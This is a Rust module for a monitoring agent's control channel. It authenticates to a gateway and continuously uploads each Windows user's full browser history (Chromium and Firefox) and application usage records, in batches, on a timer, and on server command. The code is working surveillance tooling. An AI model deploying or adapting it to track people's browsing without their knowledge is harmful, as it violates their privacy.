//! Always-on control channel (agent ⇄ Node).
//! Prefers binary WebSocket `/ws/control`; Raw TCP only when ENABLE_CONTROL_TCP=1.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tokio::time::{interval, sleep, MissedTickBehavior};
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use url::Url;

use crate::app_history::AppHistoryCollector;
use crate::browser_history::BrowserHistoryCollector;
use crate::config::AgentConfig;
use crate::connection_status;
use crate::protocol::{
    control_addr_from_gateway, encode_frame, encode_json_frame, EventKind, FrameParser, MsgType,
};
use crate::sync_cursor::SyncCursors;

const HEARTBEAT_SECS: u64 = 25;
const HISTORY_WATCH_SECS: u64 = 8;
const DEFAULT_CONTROL_PORT: u16 = 9443;
const MAX_BACKOFF_SECS: u64 = 30;
const HISTORY_BATCH_SIZE: usize = 300;

pub type ControlTx = mpsc::UnboundedSender<Vec<u8>>;

fn tcp_enabled() -> bool {
    matches!(
        std::env::var("ENABLE_CONTROL_TCP")
            .unwrap_or_default()
            .to_lowercase()
            .as_str(),
        "1" | "true" | "yes" | "on"
    )
}

fn next_backoff(current: u64) -> u64 {
    match current {
        0 | 1 => 2,
        2 => 5,
        5 => 10,
        10 => 20,
        _ => MAX_BACKOFF_SECS,
    }
}

fn control_port() -> u16 {
    std::env::var("CONTROL_TCP_PORT")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(DEFAULT_CONTROL_PORT)
}

fn resolve_tcp_addr(config: &AgentConfig) -> Option<(String, u16)> {
    if let Ok(url) = std::env::var("CONTROL_TCP_URL") {
        let cleaned = url
            .trim()
            .trim_start_matches("tcp://")
            .trim_start_matches("TCP://");
        if let Some((host, port_str)) = cleaned.rsplit_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                return Some((host.to_string(), port));
            }
        }
    }
    control_addr_from_gateway(&config.gateway_url, control_port())
}

fn resolve_ws_control_url(config: &AgentConfig) -> Option<String> {
    let base = config.gateway_url.trim();
    if base.is_empty() {
        return None;
    }
    if base.contains("/ws/gateway") {
        return Some(base.replace("/ws/gateway", "/ws/control"));
    }
    if base.ends_with('/') {
        return Some(format!("{base}ws/control"));
    }
    Some(format!("{base}/ws/control"))
}

async fn run_session(
    write_tx: ControlTx,
    mut read_rx: mpsc::UnboundedReceiver<Vec<u8>>,
    config: &AgentConfig,
    stop_flag: &Option<Arc<AtomicBool>>,
    cursors: &mut SyncCursors,
    seq_out: &mut u64,
) -> bool {
    *seq_out += 1;
    let auth = json!({
        "deviceId": config.device_id,
        "token": config.agent_token,
    });
    if write_tx
        .send(encode_json_frame(MsgType::Auth, *seq_out, &auth))
        .is_err()
    {
        return false;
    }

    let mut parser = FrameParser::new();
    let mut authed = false;
    let mut did_full_sync = false;
    let mut heartbeat = interval(Duration::from_secs(HEARTBEAT_SECS));
    heartbeat.set_missed_tick_behavior(MissedTickBehavior::Skip);
    let mut history_tick = interval(Duration::from_secs(HISTORY_WATCH_SECS));
    history_tick.set_missed_tick_behavior(MissedTickBehavior::Skip);

    loop {
        if stop_flag
            .as_ref()
            .is_some_and(|f| f.load(Ordering::SeqCst))
        {
            return true;
        }

        tokio::select! {
            chunk = read_rx.recv() => {
                let Some(chunk) = chunk else { return false; };
                let frames = parser.push(&chunk);
                for frame in frames {
                    match frame.msg_type {
                        MsgType::AuthOk => {
                            authed = true;
                            connection_status::log("Control channel AUTH_OK");
                            if !did_full_sync && cursors.needs_full_sync() {
                                let _ = push_full_history_batches(&write_tx, seq_out, cursors);
                                did_full_sync = true;
                            }
                        }
                        MsgType::AuthFail => {
                            connection_status::log("Control channel AUTH_FAIL");
                            return false;
                        }
                        MsgType::HeartbeatAck => {}
                        MsgType::EventAck => {
                            if let Ok(body) = serde_json::from_slice::<Value>(&frame.payload) {
                                apply_ack_cursor(cursors, &body);
                                cursors.save();
                            }
                        }
                        MsgType::Command => {
                            if let Ok(body) = serde_json::from_slice::<Value>(&frame.payload) {
                                let action = body.get("action").and_then(|v| v.as_str()).unwrap_or("");
                                if action == "FETCH_BROWSER_HISTORY_DELTA" || action == "FETCH_BROWSER_HISTORY" {
                                    let _ = push_browser_delta(&write_tx, seq_out, cursors);
                                }
                                if action == "FETCH_APP_HISTORY_DELTA" || action == "FETCH_APP_HISTORY" {
                                    let _ = push_app_delta(&write_tx, seq_out, cursors);
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
            _ = heartbeat.tick(), if authed => {
                *seq_out += 1;
                if write_tx.send(encode_frame(MsgType::Heartbeat, *seq_out, &[], 0)).is_err() {
                    return false;
                }
            }
            _ = history_tick.tick(), if authed => {
                let _ = push_browser_delta(&write_tx, seq_out, cursors);
                let _ = push_app_delta(&write_tx, seq_out, cursors);
            }
        }
    }
}

pub async fn run_control_loop(config: AgentConfig, stop_flag: Option<Arc<AtomicBool>>) {
    let mut backoff = 1u64;
    let mut cursors = SyncCursors::load();
    let mut seq_out: u64 = 1;

    loop {
        if stop_flag
            .as_ref()
            .is_some_and(|f| f.load(Ordering::SeqCst))
        {
            break;
        }

        let mut connected = false;

        // 1) Prefer binary WebSocket /ws/control (WS-first)
        if let Some(ws_url) = resolve_ws_control_url(&config) {
            connection_status::log(format!("Control WS connecting {ws_url}"));
            if let Ok(url) = Url::parse(&ws_url) {
                if let Ok((ws_stream, _)) = connect_async(url).await {
                    let (mut write_pipe, mut read_pipe) = ws_stream.split();
                    let (tx, mut rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    let (pong_tx, mut pong_rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    let (read_tx, read_rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    let write_tx = tx.clone();

                    let writer_task = tokio::spawn(async move {
                        loop {
                            tokio::select! {
                                bin = rx.recv() => {
                                    let Some(buf) = bin else { break; };
                                    if write_pipe.send(Message::Binary(buf)).await.is_err() {
                                        break;
                                    }
                                }
                                pong = pong_rx.recv() => {
                                    let Some(payload) = pong else { break; };
                                    if write_pipe.send(Message::Pong(payload)).await.is_err() {
                                        break;
                                    }
                                }
                            }
                        }
                    });
                    let reader_task = tokio::spawn(async move {
                        while let Some(msg) = read_pipe.next().await {
                            match msg {
                                Ok(Message::Binary(bin)) => {
                                    if read_tx.send(bin).is_err() {
                                        break;
                                    }
                                }
                                Ok(Message::Ping(p)) => {
                                    if pong_tx.send(p).is_err() {
                                        break;
                                    }
                                }
                                Ok(Message::Pong(_)) => {}
                                Ok(Message::Close(_)) | Err(_) => break,
                                _ => {}
                            }
                        }
                    });

                    connected = true;
                    backoff = 1;
                    let _ = run_session(
                        write_tx,
                        read_rx,
                        &config,
                        &stop_flag,
                        &mut cursors,
                        &mut seq_out,
                    )
                    .await;
                    writer_task.abort();
                    reader_task.abort();
                    connection_status::log("Control WS disconnected");
                }
            }
        }

        // 2) Optional Raw TCP (ENABLE_CONTROL_TCP=1 only)
        if !connected && tcp_enabled() {
            if let Some((host, port)) = resolve_tcp_addr(&config) {
                connection_status::log(format!("Control TCP connecting {host}:{port}"));
                if let Ok(stream) = TcpStream::connect((host.as_str(), port)).await {
                    let _ = stream.set_nodelay(true);
                    let (mut reader, mut writer) = stream.into_split();
                    let (tx, mut rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    let (read_tx, read_rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    let write_tx = tx.clone();

                    let writer_task = tokio::spawn(async move {
                        while let Some(buf) = rx.recv().await {
                            if writer.write_all(&buf).await.is_err() {
                                break;
                            }
                        }
                    });
                    let reader_task = tokio::spawn(async move {
                        let mut buf = vec![0u8; 64 * 1024];
                        loop {
                            match reader.read(&mut buf).await {
                                Ok(0) | Err(_) => break,
                                Ok(n) => {
                                    if read_tx.send(buf[..n].to_vec()).is_err() {
                                        break;
                                    }
                                }
                            }
                        }
                    });

                    connected = true;
                    backoff = 1;
                    let _ = run_session(
                        write_tx,
                        read_rx,
                        &config,
                        &stop_flag,
                        &mut cursors,
                        &mut seq_out,
                    )
                    .await;
                    writer_task.abort();
                    reader_task.abort();
                    connection_status::log("Control TCP disconnected");
                } else {
                    connection_status::log("Control TCP connect failed");
                }
            }
        }

        if !connected {
            connection_status::log(format!(
                "Control connect failed — retry in {backoff}s"
            ));
        }

        sleep(Duration::from_secs(backoff)).await;
        backoff = next_backoff(backoff);
    }
}

fn apply_ack_cursor(cursors: &mut SyncCursors, body: &Value) {
    if let Some(cursor) = body.get("cursor") {
        if let Some(v) = cursor.get("browser_chromium_time").and_then(|x| x.as_i64()) {
            if v > cursors.browser_chromium_time {
                cursors.browser_chromium_time = v;
            }
        }
        if let Some(v) = cursor.get("browser_firefox_time").and_then(|x| x.as_i64()) {
            if v > cursors.browser_firefox_time {
                cursors.browser_firefox_time = v;
            }
        }
        if let Some(v) = cursor.get("app_last_opened").and_then(|x| x.as_str()) {
            if v > cursors.app_last_opened.as_str() {
                cursors.app_last_opened = v.to_string();
            }
        }
        if cursor.get("full_sync_done").and_then(|x| x.as_bool()) == Some(true) {
            cursors.full_sync_done = true;
        }
    }
}

fn push_full_history_batches(
    tx: &ControlTx,
    seq_out: &mut u64,
    cursors: &mut SyncCursors,
) -> bool {
    let browser = BrowserHistoryCollector::collect_all_history();
    let mut chrome_hw = cursors.browser_chromium_time;
    let mut ff_hw = cursors.browser_firefox_time;

    for chunk in browser.chunks(HISTORY_BATCH_SIZE) {
        let items: Vec<Value> = chunk
            .iter()
            .map(|e| {
                if e.browser.to_lowercase().contains("firefox") {
                    // visit_time stored as i64-ish string sometimes — keep as-is
                }
                json!({
                    "browser": e.browser,
                    "url": e.url,
                    "title": e.title,
                    "visitTime": e.visit_time,
                    "visitCount": e.visit_count,
                    "windowsUser": e.windows_user,
                    "browserProfile": e.browser_profile,
                })
            })
            .collect();

        *seq_out += 1;
        let body = json!({
            "kind": EventKind::BrowserHistory as u8,
            "items": items,
            "incremental": false,
            "cursor": {
                "browser_chromium_time": chrome_hw,
                "browser_firefox_time": ff_hw,
            },
            "seq": cursors.bump_event_seq(),
        });
        if tx
            .send(encode_json_frame(MsgType::SyncBatch, *seq_out, &body))
            .is_err()
        {
            return false;
        }
    }

    let (max_chrome, max_ff) = BrowserHistoryCollector::discover_high_water();
    chrome_hw = chrome_hw.max(max_chrome);
    ff_hw = ff_hw.max(max_ff);
    cursors.browser_chromium_time = chrome_hw;
    cursors.browser_firefox_time = ff_hw;

    let apps = AppHistoryCollector::collect_all_app_history();
    for chunk in apps.chunks(HISTORY_BATCH_SIZE) {
        let items: Vec<Value> = chunk
            .iter()
            .map(|e| {
                json!({
                    "appName": e.app_name,
                    "executablePath": e.executable_path,
                    "lastOpened": e.last_opened,
                    "appType": e.app_type,
                    "windowsUser": e.windows_user,
                    "duration": e.duration,
                })
            })
            .collect();
        *seq_out += 1;
        let body = json!({
            "kind": EventKind::AppHistory as u8,
            "items": items,
            "incremental": false,
            "cursor": { "app_last_opened": cursors.app_last_opened },
            "seq": cursors.bump_event_seq(),
        });
        if tx
            .send(encode_json_frame(MsgType::SyncBatch, *seq_out, &body))
            .is_err()
        {
            return false;
        }
    }

    if let Some(last) = apps
        .iter()
        .map(|e| e.last_opened.as_str())
        .max()
        .map(|s| s.to_string())
    {
        cursors.app_last_opened = last;
    }

    cursors.full_sync_done = true;
    cursors.save();

    *seq_out += 1;
    let ack_hint = json!({
        "kind": EventKind::BrowserHistory as u8,
        "items": [],
        "incremental": false,
        "cursor": {
            "browser_chromium_time": cursors.browser_chromium_time,
            "browser_firefox_time": cursors.browser_firefox_time,
            "app_last_opened": cursors.app_last_opened,
            "full_sync_done": true,
        },
        "seq": cursors.bump_event_seq(),
    });
    tx.send(encode_json_frame(MsgType::SyncBatch, *seq_out, &ack_hint))
        .is_ok()
}

fn push_browser_delta(
    tx: &ControlTx,
    seq_out: &mut u64,
    cursors: &mut SyncCursors,
) -> bool {
    let (entries, new_chrome, new_ff) = BrowserHistoryCollector::collect_since(
        cursors.browser_chromium_time,
        cursors.browser_firefox_time,
    );

    if new_chrome > cursors.browser_chromium_time {
        cursors.browser_chromium_time = new_chrome;
    }
    if new_ff > cursors.browser_firefox_time {
        cursors.browser_firefox_time = new_ff;
    }
    cursors.save();

    if entries.is_empty() {
        return true;
    }

    let cursor = json!({
        "browser_chromium_time": new_chrome,
        "browser_firefox_time": new_ff,
    });

    let items: Vec<Value> = entries
        .iter()
        .map(|e| {
            json!({
                "browser": e.browser,
                "url": e.url,
                "title": e.title,
                "visitTime": e.visit_time,
                "visitCount": e.visit_count,
                "windowsUser": e.windows_user,
                "browserProfile": e.browser_profile,
            })
        })
        .collect();

    *seq_out += 1;
    let body = json!({
        "kind": EventKind::BrowserHistory as u8,
        "items": items,
        "incremental": true,
        "cursor": cursor,
        "seq": cursors.bump_event_seq(),
    });

    let frame = encode_json_frame(MsgType::SyncBatch, *seq_out, &body);
    tx.send(frame).is_ok()
}

fn push_app_delta(tx: &ControlTx, seq_out: &mut u64, cursors: &mut SyncCursors) -> bool {
    let (entries, new_cursor) = AppHistoryCollector::collect_since(&cursors.app_last_opened);
    if new_cursor > cursors.app_last_opened {
        cursors.app_last_opened = new_cursor.clone();
        cursors.save();
    }
    if entries.is_empty() {
        return true;
    }

    let items: Vec<Value> = entries
        .iter()
        .map(|e| {
            json!({
                "appName": e.app_name,
                "executablePath": e.executable_path,
                "lastOpened": e.last_opened,
                "appType": e.app_type,
                "windowsUser": e.windows_user,
                "duration": e.duration,
            })
        })
        .collect();

    *seq_out += 1;
    let body = json!({
        "kind": EventKind::AppHistory as u8,
        "items": items,
        "incremental": true,
        "cursor": { "app_last_opened": new_cursor },
        "seq": cursors.bump_event_seq(),
    });
    tx.send(encode_json_frame(MsgType::SyncBatch, *seq_out, &body))
        .is_ok()
}
